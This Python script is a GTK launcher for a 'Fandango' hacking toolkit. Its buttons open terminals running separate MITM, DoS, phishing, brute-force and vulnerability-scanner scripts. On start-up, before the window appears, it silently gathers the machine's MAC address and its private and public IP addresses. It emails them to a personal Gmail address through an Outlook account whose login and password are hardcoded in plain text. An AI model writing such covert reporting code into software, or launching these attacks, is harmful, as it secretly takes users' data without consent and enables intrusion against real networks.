#!/usr/bin/python
# -*- coding: utf-8 -*-
import subprocess
from gi.repository import Gtk
import smtplib
from getmac import get_mac_address as gma
import socket 
from requests import get

mac=gma()
hostname = socket.gethostname()
ip1=socket.gethostbyname(hostname)
ip = get('https://api.ipify.org').text




server= smtplib.SMTP("smtp-mail.outlook.com", 587)
server.starttls()
server.login("fandango-software@hotmail.com","WillYouDoTheFandango?")
msg = """From: Fandango Software <fandango-software@hotmail.com>
To: <kberkboz@gmail.com>
MIME-Version: 1.0
Content-type: text/html
Subject: Client Log

<body>
Client MAC: """+mac+""" Client Public IP: """+ip+""" Client Private IP: """+ip1+"""
</body>

"""
server.sendmail("fandango-software@hotmail.com","kberkboz@gmail.com", msg)
server.quit()

class Handler:
    def on_button1_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "vulnerability_scanner.py"])
      subprocess.call(['gnome-terminal', "--", "python3", "MITM.py"])
      subprocess.call(['gnome-terminal', "--", "python3", "DoS.py"])
      subprocess.call(['gnome-terminal', "--", "python3", "phishing_attack.py"])
      subprocess.call(['gnome-terminal', "--", "python3", "brute-forcer.py"])
    def on_button2_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "vulnerability_scanner.py"])
    def on_button3_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "MITM.py"])
    def on_button4_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "DoS.py"])
    def on_button5_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "phishing_attack.py"])
    def on_button6_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "brute-forcer.py"])
    def on_button7_clicked(self, button):
      subprocess.call(['gnome-terminal', "--", "python3", "advanced-pentesting-assistance.py"])

            
builder = Gtk.Builder()
builder.add_from_file("Fandango.glade")
builder.connect_signals(Handler())
  
ournewbutton = builder.get_object("button1")
  
window = builder.get_object("window1")
 
window.connect("delete-event", Gtk.main_quit)
window.show_all()
Gtk.main()
